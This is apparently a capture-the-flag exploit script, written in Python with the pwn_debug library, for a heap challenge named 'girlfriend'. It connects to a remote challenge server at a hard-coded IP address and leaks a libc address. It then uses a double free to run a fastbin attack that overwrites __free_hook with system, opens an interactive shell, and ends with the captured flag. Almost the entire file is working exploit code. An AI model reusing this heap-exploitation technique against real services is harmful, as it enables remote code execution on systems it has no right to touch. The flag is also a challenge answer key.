# File: exp.py
# Author: raycp
# Data: 2019-04-30
# Description: exp for girlfriend

from pwn_debug.pwn_debug import *


pdbg=pwn_debug("./chall")

pdbg.context.terminal=['tmux', 'splitw', '-h']

pdbg.local("./lib/libc.so.6","./lib/ld-2.29.so")
pdbg.debug("2.29")
pdbg.remote("34.92.96.238", 10001,"./lib/libc.so.6")

#p=pdbg.run("local")
p=pdbg.run("remote")


libc=pdbg.libc
elf=pdbg.elf

def add(size,name,phone):
    p.recvuntil("choice:")
    p.sendline("1")
    p.recvuntil("name")
    p.sendline(str(size))
    p.recvuntil("name:")
    p.send(name)
    p.recvuntil("call:")
    p.send(phone)

def show(idx):
    p.recvuntil("choice:")
    p.sendline("2")
    p.recvuntil("index:")
    p.sendline(str(idx))

def call(idx):
    p.recvuntil("choice:")
    p.sendline("4")
    p.recvuntil("index")
    p.sendline(str(idx))

def pwn():
   #pdbg.bp([0xd74])
   # step1 leak address
   for i in range(0,9):
       add(0x70,'/bin/sh',str(i)*5)
   add(0x70,'/bin/sh','a')
   add(0x70,'/bin/sh','b')
   for i in range(1,8):
       call(i)
   call(0)
   add(0x500,'a'*0x20,'stri')
   show(0)
   p.recvuntil("name:\n")
   libc_base=u64(p.recvuntil('\n')[:-1].ljust(8,'\x00'))-0x3b1d10
   print "libc base",hex(libc_base)

   free_hook=libc_base+libc.symbols['__free_hook']
   malloc_hook=libc_base+libc.symbols['__malloc_hook']
   system_addr=libc_base+libc.symbols['system']
  
   #step2 fastbin attack
   #debug(0xe7d)
   call(9)
   call(10)
   call(9)

   #step3 get __free_hook and get the shell
   for i in range(22,29):
       add(0x70,'/bin/sh\x00','b')
   add(0x70,p64(free_hook),'c')
   add(0x70,p64(0),'d')
   #debug(0xc0a)
   add(0x70,p64(system_addr),'f')

   add(0x70,p64(system_addr),'f')
   pdbg.bp(0xe7d)
   #add(0x60,p64(system_addr),'f')
   call(13)
   p.interactive() #get the shell

if __name__ == '__main__':
   pwn()

#*CTF{pqyPl2seQzkX3r0YntKfOMF4i8agb56D}

